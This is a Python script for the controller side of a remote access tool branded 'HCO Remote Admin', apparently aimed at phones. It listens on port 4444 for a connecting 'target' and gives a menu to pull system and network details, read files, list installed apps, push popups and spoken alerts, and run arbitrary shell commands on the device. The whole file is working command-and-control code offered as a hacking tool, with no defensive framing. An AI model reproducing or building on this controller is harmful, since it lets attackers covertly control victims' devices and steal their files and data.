import socket
import sys

# ANSI Colors for Hacker Vibe
RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"

def banner():
    print(f"""
{CYAN}    =========================================
       HCO REMOTE ADMIN - COMMAND CONTROL    
       Coded by Azhar (Hackers Colony) v4.0   
    =========================================
{RESET}""")

def show_menu():
    print(f"""
{YELLOW}    [1]{RESET} Get Deep Target System & Network Info
{YELLOW}    [2]{RESET} Send Voice Alert (Text-to-Speech)
{YELLOW}    [3]{RESET} Download / Read File From Target
{YELLOW}    [4]{RESET} Push Auto-Note / Popup Text on Screen
{YELLOW}    [5]{RESET} List All Installed Apps on Target
{YELLOW}    [6]{RESET} Check Target Battery & Storage Status
{YELLOW}    [7]{RESET} Execute Custom Shell Command
{YELLOW}    [8]{RESET} Exit Session
    -----------------------------------------
""")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 4444))
    server.listen(1)
    
    banner()
    print(f"{GREEN}[*] Server started on port 4444... Waiting for target...{RESET}")
    
    conn, addr = server.accept()
    print(f"\n{GREEN}[+] SUCCESS: Target connected from {addr}{RESET}\n")
    
    while True:
        show_menu()
        choice = input(f"{BOLD}{CYAN}HCO-ControlCenter> {RESET}").strip()
        
        if choice == '1':
            conn.send(b'sysinfo')
            print(f"\n{YELLOW}[*] Fetching deep system and network intel...{RESET}")
            output = conn.recv(8192).decode()
            print(f"\n{GREEN}--- DEEP TARGET INTEL REPORT ---\n{output}\n----------------------------------{RESET}")
            
        elif choice == '2':
            msg = input(f"{YELLOW}[?] Enter text message to speak on target phone: {RESET}")
            conn.send(f"alert:{msg}".encode())
            output = conn.recv(1024).decode()
            print(f"\n{GREEN}[+] {output}{RESET}")
            
        elif choice == '3':
            file_path = input(f"{YELLOW}[?] Enter full path of file to download/read: {RESET}")
            conn.send(f"download:{file_path}".encode())
            output = conn.recv(8192).decode()
            print(f"\n{GREEN}--- FILE CONTENT ---\n{output}\n--------------------{RESET}")
            
        elif choice == '4':
            note_text = input(f"{YELLOW}[?] Enter notification text for target screen: {RESET}")
            conn.send(f"popup:{note_text}".encode())
            output = conn.recv(1024).decode()
            print(f"\n{GREEN}[+] {output}{RESET}")
            
        elif choice == '5':
            conn.send(b'apps')
            print(f"\n{YELLOW}[*] Extracting installed applications list from target...{RESET}")
            output = conn.recv(16384).decode()
            print(f"\n{GREEN}--- INSTALLED APPS ---\n{output}\n----------------------{RESET}")
            
        elif choice == '6':
            conn.send(b'battery')
            print(f"\n{YELLOW}[*] Checking battery health and storage...{RESET}")
            output = conn.recv(4096).decode()
            print(f"\n{GREEN}--- BATTERY & STORAGE REPORT ---\n{output}\n--------------------------------{RESET}")
            
        elif choice == '7':
            cmd = input(f"{BOLD}{MAGENTA}HCO-Shell> {RESET}")
            if cmd.strip() == "": continue
            conn.send(f"cmd:{cmd}".encode())
            output = conn.recv(8192).decode()
            print(f"\n{GREEN}--- COMMAND OUTPUT ---\n{output}\n----------------------{RESET}")
            
        elif choice == '8':
            conn.send(b'exit')
            print(f"{RED}[*] Terminating session securely.{RESET}")
            break
        else:
            print(f"{RED}[-] Invalid Option! Choose between 1-8.{RESET}")
            
    conn.close()
    server.close()

if __name__ == "__main__":
    start_server()
    
